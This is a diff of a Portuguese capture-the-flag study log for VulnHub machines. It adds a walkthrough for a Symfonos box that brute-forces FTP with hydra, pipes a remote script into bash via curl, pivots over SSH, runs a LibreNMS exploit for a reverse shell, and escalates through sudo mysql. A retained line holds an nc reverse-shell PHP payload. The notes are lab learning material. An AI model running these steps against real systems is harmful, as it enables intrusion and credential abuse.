@@ -15,7 +15,8 @@ Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
 Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
 Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
 Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
-Desafio 16 - </br>
+Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
+Desafio 17 - </br>
 <br/>**--VM--**
 	
 	
@@ -591,3 +592,75 @@ Desafio 16 - </br>
 								
 							-------------------------
 							reverse_shell -> <!php exec("nc 192.168.100.4 443 -e /bin/bash"); !>
+
+
+<h3>Dia 15 			21/9/2020</h3>
+
+	*scan
+		smbd...
+	
+	*enum4linux ip
+		smbclient //192.168.100.19/anonymous
+			get backups/logs.txt
+				User                            aeolus
+				Group                          aeolus
+	
+	*hydra -> o serviço ssh está com segurança(banindo), tentaremos o ftp				
+		hydra -l aeolus -P rockyou.txt 192.168.100.19 ftp
+					-l (nome_específico_usurário) -L(lista_user)
+					-p(senha_específica)              -P(wordlist)
+					
+					
+	*ssh
+		ssh aeolus@192.168.100.19
+			password: sergioteamo
+			
+	*LinEnum
+		https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+		
+			#apenas copie o linenum.sh e cole no kali
+			
+			kali: python -m SimpleHTTPServer 8080
+			ssh_alvo: curl -s http://192.168.100.4:8080/arquivo_linenum.sh | bash
+													ip_kali
+													
+			[-] Listening TCP:
+				LISTEN     0      128    127.0.0.1:8080 
+					acesso negado, apenas o host pode acessar
+
+
+	* pivoting shh
+	#ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ip_compromised>
+		ssh	-L 8081:localhost:8080 aeolus@192.168.100.19
+			
+	*navegador_kali
+		localhost:8081
+		
+		user: aeolus
+		password: sergioteamo
+		
+			#searchsploit librenms
+			#searchsploit -m 47044.py
+			#cat 47044.py
+	*burp
+		capturar o cookie da seção
+		caso não consiga capturar:
+			Iniciar o navegador pelo burp -> Intercept is on, Open Browser
+			caso de erro, execute: ind .BurpSuite -name chrome-sandbox -exec chown root:root {} \; -exec chmod 4755 {} \;
+					\ tente executar o burp sem ser root
+		
+	*nc -lnvp 443
+	python 47044.py http://localhost:8081 'cookie(PHPSESSID=...)' 192.168.100.4 443
+		
+		#problemas na execução:
+			(precisa estar conectado a internet) -> instalar o pip 
+					curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+					python get-pip.py
+					
+				pip install requests 
+								nome do pacote que não foi encontrado, no meu caso foi o requests
+	
+		python -c 'import pty;pty.spawn("/bin/sh")'
+		sudo -l
+		sudo /usr/bin/mysql
+			\! sh
